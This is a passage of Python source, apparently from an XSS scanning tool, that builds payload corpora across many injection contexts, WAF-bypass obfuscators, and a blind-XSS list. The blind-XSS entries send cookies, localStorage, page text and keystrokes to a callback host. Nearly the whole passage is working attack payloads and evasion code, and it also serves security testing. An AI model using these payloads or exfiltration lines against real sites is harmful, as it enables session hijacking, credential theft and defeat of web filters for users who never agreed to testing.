            out["css"].append(("bulk:css-fn", "<xss style=\"%s(%s)\">" % (fn, c)))

    # comment contexts
    for b in ("-->", "--!>", "-- >", "<!--", "/*", "*/", "]", "//", "--><!--"):
        for tag in _ATTR_TAGS[:15]:
            for ev in _ATTR_EVENTS[:5]:
                out["comment"].append(("bulk:com", b + "<%s %s=alert('__M__')>" % (tag, ev)))

    # svg contexts
    for child in ("script", "animate", "set", "discard", "handler", "a", "use",
                  "image", "foreignObject", "text", "tspan", "title", "desc",
                  "g", "symbol", "marker", "pattern", "mask", "filter", "feImage"):
        for ev in _ATTR_EVENTS[:16]:
            out["svg"].append(("bulk:svg1", "<svg><%s %s=alert('__M__')>" % (child, ev)))
            out["svg"].append(("bulk:svg2", "<svg %s=alert('__M__')><%s>" % (ev, child)))

    # mutation / parser confusion
    for o in _MXSS_OUTER:
        for i in _MXSS_INNER:
            out["mxss"].append(("bulk:mxss1", o + i))
            out["mxss"].append(("bulk:mxss2", o + "\">" + i))
            out["mxss"].append(("bulk:mxss3", o + i + "</" + re.sub(r"[^a-zA-Z]", "", o)[:6] + ">"))

    # csp / jsonp gadgets
    for host in _JSONP_HOSTS:
        for cb in _SCRIPT_CORES[:12]:
            out["csp"].append(("bulk:csp-jsonp", "<script src=\"%s%s\"></script>" % (host, cb)))
            out["jsonp"].append(("bulk:jsonp", "<script src=\"%s%s\"></script>" % (host, cb)))
    for t in ("<base href=\"javascript:alert('__M__')//\">",
              "<script src=\"data:,alert('__M__')\">/</script>",
              "<iframe srcdoc=\"<script>alert('__M__')</script>\">",
              "<form><button formaction=javascript:alert('__M__')>x",
              "<svg><a><animate attributeName=href values=javascript:alert('__M__') /></a></svg>",
              "<input autofocus onfocus=alert('__M__')>",
              "<details open ontoggle=alert('__M__')>"):
        out["csp"].append(("bulk:csp-inline", t))

    # WAF-evasion call primitives seen in XSStrike/Dalfox generators.
    # These avoid a literal `alert(` by using Function.bind, array.find,
    # comma-expression IIFE, and JS-string breakers — useful when a filter
    # blocks the `alert(` token but allows the surrounding syntax.
    _evasion_calls = [
        "alert.bind()(1)",
        "[8].find(alert)(1)",
        "[8].find(confirm)(1)",
        "[8].find(prompt)(1)",
        "(alert)(1)",
        "(0,alert)(1)",
        "new Function('alert(1)')()",
        "[].constructor.constructor('alert(1)')()",
        "''.constructor.constructor('alert(1)')()",
        "confirm.bind()(1)",
        "self['al'+'ert'](1)",
        "top['al'+'ert'](1)",
    ]
    for ev in _evasion_calls:
        for tpl in ("<svg onload=%s>", "<svg/onload=%s>",
                    "<img src=x onerror=%s>", "<details open ontoggle=%s>",
                    "<iframe srcdoc=\"<script>%s</script>\"></iframe>"):
            out["svg"].append(("bulk:evade-call", tpl % ev))
            out["file"].append(("bulk:evade-call", tpl % ev))
        out["script"].append(("bulk:evade-call", ev + "//"))
        # attribute event-handler form (single/double quoted breakouts)
        out["attr_dq"].append(("bulk:evade-call", '" onmouseover=%s x="' % ev))
        out["attr_sq"].append(("bulk:evade-call", "' onmouseover=%s x='" % ev))
        out["url"].append(("bulk:evade-js", "javascript:" + ev))
    # XSStrike-style JS-string breakers (script context)
    for brk in ("'});(confirm)()//", '"});(alert)()//',
                "\\';(confirm)()//", '\\";(alert)()//',
                "}';(confirm)()//", "}`;(prompt)()//"):
        out["script"].append(("bulk:js-break", brk))

    # polyglots
    cores = _SCRIPT_CORES[:12]
    for c in cores:
        for pre in ("", "'", '"', "'\"", "\"", "`", "/*", "//", "-->",
                    "</script>", "</title>", "\n", "\t"):
            for post in ("", "//", "/*", "-->", "</script>", "'", '"', "`"):
                out["polyglot"].append(("bulk:poly", pre + c + post))

    # angular / vue CSTI
    for expr in _ANGULAR_EXPRS:
        for wr in _ANGULAR_WRAPPERS:
            try:
                out["angular"].append(("bulk:ng", wr % expr))
            except TypeError:
                pass
    for expr in _VUE_EXPRS:
        for wr in _VUE_WRAPPERS:
            try:
                out["vue"].append(("bulk:vue", wr % expr))
            except TypeError:
                pass

    # dom sinks
    for tpl in _DOM_TEMPLATES:
        for c in _SCRIPT_CORES[:15]:
            out["dom"].append(("bulk:dom", "<script>" + (tpl % json.dumps(c)) + "</script>"))
    for src in ("location.hash", "location.search", "document.referrer", "window.name"):
        for c in _SCRIPT_CORES[:8]:
            out["dom"].append(("bulk:dom-src", "<script>document.body.innerHTML=%s</script>" % json.dumps(c)))
            out["dom"].append(("bulk:dom-hash", "#" + c))

    # prototype pollution
    for k in _PROTO_KEYS:
        for v in _PROTO_VALS:
            out["prototype"].append(("bulk:proto", "__proto__[%s]=%s" % (k, v)))
            out["prototype"].append(("bulk:proto2", "constructor[prototype][%s]=%s" % (k, v)))

    # postMessage
    for tgt in _POST_TARGETS:
        for p in _SCRIPT_CORES[:15]:
            out["postmessage"].append(("bulk:pm", "<script>%s.postMessage(%s,'*')</script>"
                                       % (tgt, json.dumps(p))))
            out["postmessage"].append(("bulk:pm-ev", "<script>addEventListener('message',function(e){eval(e.data)})</script><script>%s.postMessage(%s,'*')</script>"
                                       % (tgt, json.dumps(p))))

    # markdown
    for tpl in _MD_TEMPLATES:
        for p in _MD_PAYLOADS:
            try:
                out["markdown"].append(("bulk:md", tpl % p))
            except TypeError:
                pass

    # file upload / polyglot files
    for wr in _FILE_WRAPPERS:
        for c in _FILE_CORES:
            try:
                out["file"].append(("bulk:file", wr % c))
            except TypeError:
                pass

    # RCDATA
    for closer in _RCDATA_CLOSERS:
        for tag in _ATTR_TAGS[:15]:
            for ev in _ATTR_EVENTS[:2]:
                out["rcdata"].append(("bulk:rc", closer + "<%s %s=alert('__M__')>" % (tag, ev)))

    # WAF / firewall variants
    for tag in _ATTR_TAGS[:25]:
        for ev in _ATTR_EVENTS[:12]:
            out["waf"].append(("bulk:waf", "<%s %s=alert('__M__')>" % (tag, ev)))
            out["waf"].append(("bulk:waf-slash", "<%s/%s=alert('__M__')>" % (tag, ev)))
            out["waf"].append(("bulk:waf-tab", "<%s\t%s=alert('__M__')>" % (tag, ev)))
            out["waf"].append(("bulk:waf-nl", "<%s\n%s=alert('__M__')>" % (tag, ev)))
            out["waf"].append(("bulk:waf-comment", "<%s %s/**/=alert('__M__')>" % (tag, ev)))
            out["waf"].append(("bulk:waf-concat", "<%s %s=window['ale'+'rt']('__M__')>" % (tag, ev)))
            out["waf"].append(("bulk:waf-b64", "<%s %s=eval(atob('__B64__'))>" % (tag, ev)))
            out["waf"].append(("bulk:waf-fcc", "<%s %s=String.fromCharCode(__FCC__)>" % (tag, ev)))
    out["firewall"] = list(out["waf"])
    return out


def _gen_gap_families():
    families = {
        "url": [
            ("gap:proto-colon", "javascript&colon;alert('__M__')"),
            ("gap:proto-tab", "java&#x09;script:alert('__M__')"),
            ("gap:proto-newline", "java&#10;script:alert('__M__')"),
            ("gap:proto-entity-j", "&#74;avascript:alert('__M__')"),
            ("gap:proto-raw-entity", "java&Tab;script:alert('__M__')"),
            ("gap:proto-percent", "javasc%72ipt:alert('__M__')"),
            ("gap:proto-leading-space", " javascript:alert('__M__')"),
            ("gap:proto-backslash", "java\\script:alert('__M__')"),
        ],
        "waf": [
            ("gap:poly-svg", "<SvG / onfake=\"x=54Ur0N\" oNlOaD=;1^(\\u0061\\u006c\\u0065\\u0072\\u0074)('__M__')^1//>"),
            ("gap:poly-svg-backtick", "<SvG / onfake=\"x=54Ur0N\" oNlOaD=;1^(\\u0061\\u006c\\u0065\\u0072\\u0074)`'__M__'`^1//>"),
            ("gap:poly-mixed", "<sVg/oNlOaD=alert('__M__')>"),
            ("gap:poly-img", "<img/src=x/oNerror=alert('__M__')>"),
            ("gap:poly-a", "<a/href=javascript:alert('__M__')>x</a>"),
            ("gap:poly-comment", "<scr<!---->ipt>alert('__M__')</scr<!---->ipt>"),
            ("gap:hpp-quote", "1'&__HPP__=alert('__M__')&'2"),
            ("gap:hpp-comment", "1'&__HPP__=alert('__M__')//"),
            ("gap:hpp-tag", "x&__HPP__=<svg onload=alert('__M__')>"),
            ("gap:hpp-concat", "1'+1;let+asd=window&__HPP__=def='al'+'ert'+;asd[def](1&__HPP__=2);'"),
            ("gap:size-window", "A" * 2048 + "<svg onload=alert('__M__')>"),
        ],
        "script": [
            ("gap:escaped-sq", "test\\';alert('__M__');//"),
            ("gap:escaped-dq", "test\\\";alert('__M__');//"),
            ("gap:escaped-u0027", "\\u0027;alert('__M__');//"),
            ("gap:split-eval", "a=\"a\";b=\"l\";c=\"e\";d=\"r\";t=\"t\";eval(a+b+c+d+t+\"('__M__')\")"),
            ("gap:split-window", "window[[\"a\",\"l\",\"e\",\"r\",\"t\"].join(\"\")]('__M__')"),
            ("gap:split-constructor", "[].constructor.constructor(\"al\"+\"ert('__M__')\")()"),
            ("gap:split-concat", "eval('al'+'ert(\\\"__M__\\\")')"),
            ("gap:jsexec-expr", "-alert('__M__')-"),
            ("gap:jsexec-plus", "+alert('__M__')+"),
            ("gap:jsexec-comma", ",alert('__M__'),"),
            ("gap:jsexec-close", "');alert('__M__');//"),
            ("gap:jsexec-brace", "});alert('__M__');//"),
            ("gap:jsexec-template", "${alert('__M__')}"),
            ("gap:jsexec-eval-arg", "alert('__M__')//"),
            ("gap:jsexec-timeout", "'+alert('__M__')+'"),
        ],
        "mxss": [
            ("gap:mxss-foreignobject", "<svg><foreignobject><img src=x onerror=alert('__M__')></foreignobject></svg>"),
            ("gap:mxss-annotation", "<math><annotation-xml encoding=text/html><img src=x onerror=alert('__M__')></annotation-xml></math>"),
            ("gap:mxss-mglyph-style", "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('__M__')>"),
            ("gap:mxss-noscript", "<noscript><p title=\"</noscript><img src=x onerror=alert('__M__')\">\">"),
            ("gap:mxss-style-reset", "<style><style/><img src=x onerror=alert('__M__')>"),
            ("gap:mxss-svg-p-style", "<svg><p><style><img src=x onerror=alert('__M__')></style></p></svg>"),
            ("gap:mxss-form-reparse", "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert('__M__')>"),
        ],
        "dom": [
            ("gap:clobber-currentscript", "<img name=currentScript src=x onerror=alert('__M__')>"),
            ("gap:clobber-module-export", "<a id=module name=xss href=\"data:text/javascript,alert('__M__')\"></a><script>import(module.xss)</script>"),
            ("gap:clobber-window-doc", "<a id=document name=write href=\"javascript:alert('__M__')\"></a><script>document.write(1)</script>"),
            ("gap:clobber-named-src", "<a id=c name=src href=\"data:text/javascript,alert('__M__')\"></a><a id=c name=innerHTML></a><script>document.body.append(c.innerHTML)</script>"),
            ("gap:clobber-script-current", "<a id=currentScript name=src href=\"data:text/javascript,alert('__M__')\"></a><script>document.currentScript.src</script>"),
            ("gap:clobber-config-chain", "<form id=config><input name=url value=\"javascript:alert('__M__')\"></form><script>location=config.url</script>"),
            ("gap:clobber-named-tree", "<a id=default></a><a id=default name=src href=\"data:text/javascript,alert('__M__')\"></a><script>document.body.appendChild(document.createElement('script')).src=default.src</script>"),
            ("gap:clobber-formaction", "<form id=f action=\"javascript:alert('__M__')\"></form><script>f.submit()</script>"),
            ("gap:clobber-action", "<form id=x><input name=action value=\"javascript:alert('__M__')\"></form><script>location=x.action</script>"),
            ("gap:clobber-href", "<a id=x href=\"javascript:alert('__M__')\"></a><script>location=x.href</script>"),
            ("gap:clobber-body", "<img name=body src=x onerror=alert('__M__')>"),
            ("gap:clobber-cookie", "<img name=cookie src=x onerror=alert('__M__')>"),
            ("gap:clobber-attributes", "<form><input name=attributes></form><script>alert('__M__')</script>"),
        ],
        "csp": [
            ("gap:tt-policy", "<script>if(window.trustedTypes)trustedTypes.createPolicy('x',{createHTML:s=>s});document.write(\"<img src=x onerror=alert('__M__')>\")</script>"),
            ("gap:data-js", "<script src=data:text/javascript,alert('__M__')></script>"),
            ("gap:blob-js", "<script>var b=new Blob([\"alert('__M__')\"],{type:'text/javascript'});var s=document.createElement('script');s.src=URL.createObjectURL(b);document.body.appendChild(s)</script>"),
            ("gap:strict-dynamic", "<script nonce=\"__NONCE__\">var s=document.createElement('script');s.text=\"alert('__M__')\";document.body.appendChild(s)</script>"),
            ("gap:nonce-reuse", "<script nonce=\"__NONCE__\">alert('__M__')</script>"),
            ("gap:base-hijack", "<base href=\"__CB__/\"><script src=x></script>"),
            ("gap:object-data", "<object data=\"data:text/html,<script>alert('__M__')</script>\"></object>"),
            ("gap:embed-data", "<embed src=\"data:text/html,<script>alert('__M__')</script>\">"),
            ("gap:srcdoc", "<iframe srcdoc=\"<script>alert('__M__')</script>\"></iframe>"),
            ("gap:jsonp-callback", "<script>__M__</script>"),
        ],
        "file": [
            ("gap:upload-svg-script", "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert('__M__')</script></svg>"),
            ("gap:upload-svg-onload", "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('__M__')\"/>"),
            ("gap:upload-html", "<html><body><script>alert('__M__')</script></body></html>"),
            ("gap:upload-html-img", "<!doctype html><img src=x onerror=alert('__M__')>"),
            ("gap:upload-filename-svg", "\"><svg onload=alert('__M__')>.svg"),
            ("gap:upload-filename-html", "\"><img src=x onerror=alert('__M__')>.html"),
            ("gap:upload-fragment", "xss.svg#<svg onload=alert('__M__')>"),
            ("gap:upload-svg-foreign", "<svg xmlns=\"http://www.w3.org/2000/svg\"><foreignObject><iframe srcdoc=\"<script>alert('__M__')</script>\"></iframe></foreignObject></svg>"),
        ],
    }
    return families


def _dedupe(items):
    out = []
    seen = set()
    for name, payload in items:
        if payload in seen:
            continue
        seen.add(payload)
        out.append((name, payload))
    return out


def _build():
    payloads = {k: list(v) for k, v in CURATED.items()}
    payloads.setdefault("html", []).extend(_gen_html_variants())
    dq, sq, uq = _gen_attr_variants()
    payloads["attr_dq"].extend(dq)
    payloads["attr_sq"].extend(sq)
    payloads["attr_unquoted"].extend(uq)
    payloads["script"].extend(_gen_script_variants())
    payloads["encoding"].extend(_gen_encoding_variants())
    payloads["url"].extend(_gen_url_variants())
    for cat in ("html", "attr_dq", "attr_sq", "attr_unquoted", "svg",
                "mxss", "rcdata", "comment", "url"):
        payloads.setdefault(cat, []).extend(MODERN_VECTORS)
    for cat, items in REALWORLD_2026.items():
        payloads.setdefault(cat, []).extend(items)
    corp = _gen_corpus_categories()
    payloads["html"].extend(corp["corpus_html"])
    payloads["url"].extend(corp["corpus_url"])
    payloads["script"].extend(corp["corpus_script"])
    payloads["angular"].extend(corp["corpus_csti"])
    payloads["vue"].extend(corp["corpus_csti"])
    payloads["prototype"].extend(corp["corpus_proto"])
    for cat, items in _gen_bulk().items():
        payloads.setdefault(cat, []).extend(items)
    for cat, items in _gen_gap_families().items():
        payloads.setdefault(cat, []).extend(items)
    poly_file = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "polyglot_payloads.txt")
    if os.path.exists(poly_file):
        with open(poly_file, encoding="utf-8", errors="replace") as fh:
            for line in fh:
                line = line.rstrip("\n")
                if line and not line.startswith("#"):
                    payloads["polyglot"].append(("polyglot:innerht", line))
    if "waf" in payloads:
        payloads["firewall"] = list(payloads["waf"])
    for k in payloads:
        payloads[k] = _dedupe(payloads[k])
    return payloads


PAYLOADS = _build()

CONTEXT_CATEGORIES = {
    "html": ["html", "corpus_html", "polyglot", "waf", "firewall",
             "encoding", "angular", "vue", "dom", "csp"],
    "rcdata": ["rcdata", "html", "corpus_html", "encoding", "waf", "polyglot"],
    "attr_dq": ["attr_dq", "url", "jsonp", "encoding", "waf", "firewall", "polyglot"],
    "attr_sq": ["attr_sq", "url", "jsonp", "encoding", "waf", "firewall", "polyglot"],
    "attr_unquoted": ["attr_unquoted", "url", "encoding", "waf", "firewall", "polyglot"],
    "attr_name": ["attr_dq", "attr_sq", "attr_unquoted", "waf", "firewall"],
    "script": ["script", "corpus_script", "angular", "vue", "encoding", "waf", "polyglot"],
    "script_string": ["script", "encoding", "waf"],
    "comment": ["comment", "html", "corpus_html", "waf"],
    "css": ["css", "html", "corpus_html", "waf"],
    "url": ["url", "corpus_url", "encoding", "waf", "polyglot"],
    "svg": ["svg", "file", "html", "corpus_html", "mxss", "encoding", "waf"],
    "mxss": ["mxss", "html", "corpus_html", "encoding", "waf"],
    "csp": ["csp", "jsonp", "svg", "encoding", "waf", "html", "corpus_html"],
    "dom": ["dom", "html", "corpus_html", "angular", "vue", "encoding", "waf"],
    "json": ["html", "corpus_html", "encoding", "waf"],
    "text": ["html", "corpus_html", "polyglot", "waf"],
}

BLIND_PAYLOADS = [
    ("script-src", "\"><script src=__CB__></script>"),
    ("img-fetch", "<img src=x onerror=\"fetch('__CB__')\">"),
    ("cookie-exfil", "<script>new Image().src='__CB__?c='+encodeURIComponent(document.cookie)</script>"),
    ("svg", "<svg onload=\"fetch('__CB__')\">"),
    ("fetch-beacon", "<script>fetch('__CB__',{mode:'no-cors'})</script>"),
    ("iframe", "<iframe src=__CB__>"),
    ("object", "<object data=__CB__></object>"),
    ("link-prefetch", "<link rel=prefetch href=__CB__>"),
    ("xhr", "<script>var x=new XMLHttpRequest();x.open('GET','__CB__');x.send()</script>"),
    ("storage-exfil", "<script>fetch('__CB__?ls='+encodeURIComponent(JSON.stringify(localStorage)))</script>"),
    ("dom-exfil", "<script>fetch('__CB__?dom='+encodeURIComponent(document.body.innerText.slice(0,800)))</script>"),
    ("keylog", "<img src=x onerror=\"document.onkeypress=function(e){fetch('__CB__?k='+e.key)}\">"),
    ("url-exfil", "<script>fetch('__CB__?u='+encodeURIComponent(location.href))</script>"),
    ("sendbeacon", "<script>navigator.sendBeacon('__CB__',document.cookie)</script>"),
    ("err-stack", "<img src=x onerror=\"fetch('__CB__?e='+encodeURIComponent(new Error().stack))\">"),
]

COVERAGE = [
    ("Reflected XSS", "automated", "context tokenizer + differential reflection + browser proof"),
    ("Stored XSS", "automated workflow", "--stored seeds then re-fetches trigger URLs"),
    ("DOM-based XSS", "automated", "static source->sink taint analysis + browser fragment/hash fuzzing"),
    ("Blind XSS", "automated", "--oob-server built-in collaborator or --blind external callback"),
    ("Self-XSS (CSRF-XSS)", "manual", "payloads provided; delivery out of scope"),
    ("Mutation XSS (mXSS)", "automated", "mxss set: sanitizer re-contextualization bypasses"),
    ("Polyglot XSS", "automated", "polyglot set: context-agnostic vectors"),
    ("WAF / filter bypass", "automated", "waf+firewall sets, WAF fingerprinting, on-the-fly encoders"),
    ("Encoding: base64 / data URI", "automated", "b64 data URI, atob/eval, UTF-7, UTF-16be"),
    ("Encoding: URL / double-URL", "automated", "%3C single + %253C double, encoded scheme"),
    ("Encoding: HTML entity/hex", "automated", "decimal + hex entities in tags/events"),
    ("Encoding: JS \\u/\\x escapes", "automated", "unicode + hex escapes in script/event"),
    ("CSP bypass", "payload+manual", "csp/jsonp sets; parse CSP header for allowed CDN gadgets"),
    ("JSONP / script gadget", "payload+manual", "jsonp set; allowed-CDN JSONP callback detection"),
    ("Client-side template injection", "automated", "angular + vue sets when input lands in template"),
    ("Prototype pollution -> DOM XSS", "payload+manual", "prototype set; param-name injection + gadget discovery"),
    ("postMessage XSS", "payload+manual", "postmessage set; origin-check audit"),
    ("SVG / file-upload XSS", "payload+manual", "file+svg sets; served content-type checks"),
    ("Markdown injection", "automated", "markdown set when rendered by a markdown sink"),
    ("CSS injection", "limited", "css set; style context only"),
    ("Header / cookie XSS", "automated", "header and cookie injection points"),
    ("Path / fragment XSS", "automated", "path-segment and URL-fragment injection points"),
    ("JSON / multipart body", "automated", "nested JSON paths and multipart fields"),
    ("OAuth redirect_uri XSS", "automated", "url set on authorize/callback/error params"),
    ("Legacy Flash/PDF JS", "manual", "out of tooling scope; manual analysis"),
]



# ---------------------------------------------------------------------------
# Filter / WAF bypass layer
# ---------------------------------------------------------------------------

_PLACE_RE = re.compile(r"__(?:M|B64DOC|B64|FCC|CB)__")


def _outside(payload, fn):
    """Transform payload text while leaving runtime placeholders untouched."""
    out = []
    last = 0
    for m in _PLACE_RE.finditer(payload):
        out.append(fn(payload[last:m.start()]))
        out.append(m.group(0))
        last = m.end()
    out.append(fn(payload[last:]))
    return "".join(out)


def _mix_case(s):
    return "".join(
        ch.swapcase() if (i % 2 and ch.isalpha()) else ch for i, ch in enumerate(s))


def _b_case(p):
    """Vary HTML tag/attribute case only; JS identifiers are case-sensitive."""
    parts = re.split(r"('[^']*'|\"[^\"]*\"|`[^`]*`)", p)
    for i in range(0, len(parts), 2):
        seg = re.sub(r"(</?)([a-zA-Z][a-zA-Z0-9-]*)",
                     lambda m: m.group(1) + _mix_case(m.group(2)), parts[i])
        seg = re.sub(r"\b([a-zA-Z][a-zA-Z0-9_-]*)(\s*=)",
                     lambda m: _mix_case(m.group(1)) + m.group(2), seg)
        parts[i] = seg
    return "".join(parts)


def _b_tagcase(p):
    return _outside(p, lambda s: re.sub(
        r"<([a-zA-Z][a-zA-Z0-9]*)",
        lambda m: m.group(0)[:1] + "".join(
            c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group(1))),
        s))


def _b_comment(p):
    def fn(s):
        return re.sub(r"<([a-zA-Z][a-zA-Z0-9]*)", lambda m: (
            "<" + m.group(1)[:max(1, len(m.group(1)) // 2)] + "<!---->" +
            m.group(1)[max(1, len(m.group(1)) // 2):]), s)
    return _outside(p, fn)


def _b_space(sep):
    return lambda p: _outside(p, lambda s: s.replace(" ", sep))


def _b_slash(p):
    return _outside(p, lambda s: re.sub(r"(<[a-zA-Z][a-zA-Z0-9]*)\s+", r"\1/", s))


def _b_entity_call(p):
    return _outside(p, lambda s: re.sub(
        r"\b(alert|confirm|prompt|print|eval|Function|setTimeout)\b",
        lambda m: "".join("&#%d;" % ord(c) for c in m.group(1)), s))


def _b_unicode_call(p):
    return _outside(p, lambda s: re.sub(
        r"\b(alert|confirm|prompt|print)\b",
        lambda m: "".join("\\u%04x" % ord(c) for c in m.group(1)), s))


def _b_window_call(p):
    return _outside(p, lambda s: re.sub(
        r"\b(alert|confirm|prompt|print)\s*\(", r"window['\1'](", s))


def _b_concat_call(p):
    return _outside(p, lambda s: re.sub(
        r"\b(alert|confirm|prompt|print)\s*\(",
        lambda m: "window['%s'+'%s'](" % (m.group(1)[:3], m.group(1)[3:]), s))


def _b_angle(p):
    return _outside(p, lambda s: s.replace("<", "&#60;").replace(">", "&#62;"))


def _b_url(p):
    return _outside(p, lambda s: urllib.parse.quote(s, safe=""))


def _b_url2(p):
    return _outside(p, lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=""), safe=""))


def _b_null(p):
    return _outside(p, lambda s: s + "%00")


def _b_lead(p):
    return _outside(p, lambda s: ("\t" + s) if s and not s.startswith("\t") else s)


def _b_fullwidth(p):
    return _outside(p, _fullwidth)


def _b_noquote(p):
    return _noquote(p, "/%s/") if _CANARY_QUOTED.search(p) else p


def _b_combo(p):
    return _b_concat_call(_b_tagcase(p))


BYPASS_TECHNIQUES = {
    "combo": _b_combo,
    "case": _b_case,
    "tag-case": _b_tagcase,
    "comment": _b_comment,
    "slash-space": _b_slash,
    "tab-space": _b_space("\t"),
    "newline-space": _b_space("\n"),
    "cr-space": _b_space("\r"),
    "ff-space": _b_space("\f"),
    "entity-call": _b_entity_call,
    "unicode-call": _b_unicode_call,
    "window-call": _b_window_call,
    "concat-call": _b_concat_call,
    "angle-entity": _b_angle,
    "url-encode": _b_url,
    "url-encode2": _b_url2,
    "null-byte": _b_null,
    "lead-ws": _b_lead,
    "fullwidth": _b_fullwidth,
    "noquote": _b_noquote,
}


def bypass_variants(payload, context=None, limit=4):
    """Return (name, obfuscated_payload) variants for filter/WAF evasion.

    Runtime placeholders (``__M__`` etc.) are preserved verbatim so the canary
    still lands in every generated variant.
    """
    out = []
    seen = {payload}
    if context in ("script", "script_string"):
        preferred = ("noquote", "unicode-call", "window-call", "concat-call",
                     "case", "comment", "lead-ws", "null-byte")
    elif context in ("css", "comment"):
        preferred = ("case", "comment", "tab-space", "newline-space",
                     "cr-space", "ff-space", "lead-ws")
    else:
        preferred = ("combo", "angle-entity", "entity-call", "case",
                     "comment", "tag-case", "tab-space", "newline-space",
                     "cr-space", "ff-space")
    order = [n for n in preferred if n in BYPASS_TECHNIQUES]
    order += [n for n in BYPASS_TECHNIQUES if n not in order]
    for name in order:
        fn = BYPASS_TECHNIQUES[name]
        try:
            got = fn(payload)
        except Exception:
            continue
        if not got or got in seen:
            continue
        seen.add(got)
        out.append(("bypass:%s" % name, got))
        if limit and len(out) >= limit:
            break
    return out


def corpus_size():
    return sum(len(v) for v in PAYLOADS.values())


NONCE = ""


def set_nonce(value):
    global NONCE
    NONCE = str(value or "")


def fill(payload, token):
    b64 = base64.b64encode(("alert('" + token + "')").encode()).decode()
    b64doc = base64.b64encode(("<script>alert('" + token + "')</script>").encode()).decode()
    fcc = ",".join(str(ord(ch)) for ch in ("alert('" + token + "')"))
    b64c = base64.b64encode(("console.log('" + token + "')").encode()).decode()
    out = payload.replace("__M__", token).replace("__B64DOC__", b64doc)
    out = out.replace("__B64C__", b64c)
    out = out.replace("__B64__", b64).replace("__FCC__", fcc)
    out = out.replace("__CB__", token)
    if NONCE:
        out = out.replace("__NONCE__", NONCE)
    else:
        out = out.replace(' nonce="__NONCE__"', "").replace("__NONCE__", "")
    return out


_CALL_RE = re.compile(r"\b(alert|confirm|prompt|print)\s*\(([^()]*)\)")
_LOG_RE = re.compile(r"\bconsole\s*\.\s*log\s*\(([^()]*)\)")


CANARY_STYLE = "quoted"  # quoted | ident | regex | template
_CANARY_WRAP = {"quoted": None, "ident": "%s", "regex": "/%s/", "template": "`%s`"}


def set_canary_style(style):
    global CANARY_STYLE
    if style in _CANARY_WRAP:
        CANARY_STYLE = style


def canaryize_noquote(payload, token, style="regex"):
    """Return a quote-less variant of an already-canaryized payload.

    Used to auto-escalate a quote-mangled (backslash/HTML-escaped) reflection:
    alert('TOKEN') -> alert(/TOKEN/) or alert(`TOKEN`), both survive filters
    that mangle quotes while still carrying the observable canary.
    """
    wrap = _CANARY_WRAP.get(style)
    if not wrap:
        return payload
    return _noquote(payload, wrap)


def canaryize(payload, token):
    """Force the payload's first output call to carry the canary token.

    CANARY_STYLE controls how the token is quoted. Servers that backslash-escape
    quotes (PHP addslashes / magic quotes) mangle alert('tok') into a
    SyntaxError; `regex` produces alert(/tok/) which needs no quotes.
    """
    def place(p):
        wrap = _CANARY_WRAP.get(CANARY_STYLE)
        if wrap:
            return _noquote(p.replace(token, "__M__"), wrap).replace("__M__", token)
        return p

    # Already canaryized (e.g. an encoder produced prompt('TOKEN') from
    # alert('TOKEN')): do not rewrite the proof call back to alert().
    if token in payload:
        return payload
    if "__M__" in payload or "__CB__" in payload or "__B64" in payload or "__FCC__" in payload:
        return place(fill(payload, token))
    m = _CALL_RE.search(payload)
    if m:
        start, end = m.span()
        return place(payload[:start] + "alert('%s')" % token + payload[end:])
    m = _LOG_RE.search(payload)
    if m:
        start, end = m.span()
        return place(payload[:start] + "alert('%s')" % token + payload[end:])
    return payload


EXEC_MARKERS = (
    "onerror", "onload", "ontoggle", "onfocus", "onbegin", "onstart", "onmouseover",
    "onclick", "onanimation", "ontransition", "onpointer", "onbefore", "oninput",
    "oncontentvisibility", "onclose", "oncancel", "oncommand", "onformdata",
    "onpageshow", "onpagereveal", "onscrollend", "oninvalid", "onbounce",
    "onpointerrawupdate", "onbeforexrselect",
    "<script", "javascript:", "<svg", "<iframe", "<object", "<embed", "<details",
    "<math", "<video", "<audio", "srcdoc", "autofocus", "formaction", "xlink:href",
    "alert(", "confirm(", "prompt(", "print(", "eval(", "function(", "constructor(",
    "document.write", "innerhtml", "popover", "data:text/html", "<template",
    "<noscript", "<dialog", "<meta http-equiv=refresh",
)


def looks_executable(payload):
    low = payload.lower()
    return any(m in low for m in EXEC_MARKERS)
